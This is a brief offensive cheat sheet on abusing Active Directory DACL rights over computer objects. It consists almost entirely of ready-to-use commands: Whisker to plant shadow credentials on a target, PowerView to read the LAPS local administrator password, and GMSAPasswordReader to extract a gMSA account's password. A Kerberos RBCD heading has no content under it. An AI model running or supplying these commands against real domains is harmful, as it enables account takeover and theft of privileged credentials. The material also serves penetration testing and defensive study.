# DACL Attacks on a Computer

## 1) WriteProperty

### Shadow Credentials

    Whisker.exe add /target:<target> /domain:domain.local /dc:dc.domain.local /path:C:\path\to\file.pfx /password:Password123!

### Kerberos RBCD

## 2) AllExtendedRights

### ReadLAPSPassword

#####  With PowerView

    Get-DomainComputer <target>.domain.local -Properties ms-mcs-AdmPwd,displayname,ms-mcs-AdmPwdExpirationTime

### ReadGMSAPassword

    ./GMSAPasswordReader.exe --accountname gmsaAccount

